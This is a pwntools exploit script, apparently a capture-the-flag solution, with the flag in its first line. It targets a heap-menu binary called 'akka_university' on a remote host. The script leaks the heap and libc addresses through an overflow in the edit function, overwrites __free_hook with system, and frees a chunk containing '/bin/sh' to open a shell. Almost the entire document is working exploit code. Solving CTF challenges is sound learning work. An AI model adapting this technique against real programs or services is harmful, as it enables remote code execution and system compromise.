#TamilCTF{V4n4kk4m_d4_M4pl4_4kka_University_4dM1n_P4n3L_l3_1rUndhu_1ndh4_v477i_N44_dh4n_Un1vers1tY_7oPP3r_3h!!}
from pwn import *

elf = ELF("./akka_university", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("3.99.48.161", 9006)

def sa(d):
	target.sendafter(">>", d)

def sla(d):
	sa( d+"\n")

def eval(size, remarks="R"*0x38, log="CHANGEIT", name="N"*0x14, marks=0x37):
	sla("1")
	sa(str(size))
	sa(name)
	sla(str(marks))
	sa(remarks)
	if log == "CHANGEIT":
		log = "L"*size
	sa(log)

def arrear(idx):
	sla("2")
	sla(str(idx))

def view(idx):
	sla("3")
	sla(str(idx))

def edit(idx, remarks, log="HACKINGHAHA", name="n"*0x14, marks=0x33):
	sla("4")
	sla(str(idx))
	sa(name)
	sla(str(marks))
	remarks="r"*0x38 + remarks
	sa(remarks)
	sa(log)

eval(0x68)
eval(0x68)
eval(0x68)		# actual at 0x380
eval(0x68)
arrear(0)
arrear(1)
edit(2, "\x10", "A"*8)
view(2)
target.recvuntil("A"*8)
heap_base = u64(target.recv(8)) - 0x10
log.info("HEAP Base: " + hex(heap_base))

edit(2, "\x70", "A"*8 + p64(0x601))
edit(2, p64(heap_base + 0x370 + 0x600)[:2], "f"*8 + p64(0x21) + "C"*0x10 + "f"*8 + p64(0x21))
edit(2, p64(heap_base + 0x380)[:2], "DONEEEEEE")
arrear(2)

edit(3, p64(heap_base + 0x380)[:2], "f"*8)
view(3)
target.recvuntil("f"*8)
libc_base = u64(target.recv(8)) - 0x7f3113632be0 + 0x00007f3113447000
log.info("LIBC Base: " + hex(libc_base))

edit(3, p64(heap_base + 0x310)[:2], p64(libc_base + libc.sym['__free_hook'] - 8))

eval(0x68)
eval(size=0x68, log="/bin/sh\x00"+p64(libc_base + libc.sym['system']))
arrear(5)

target.interactive()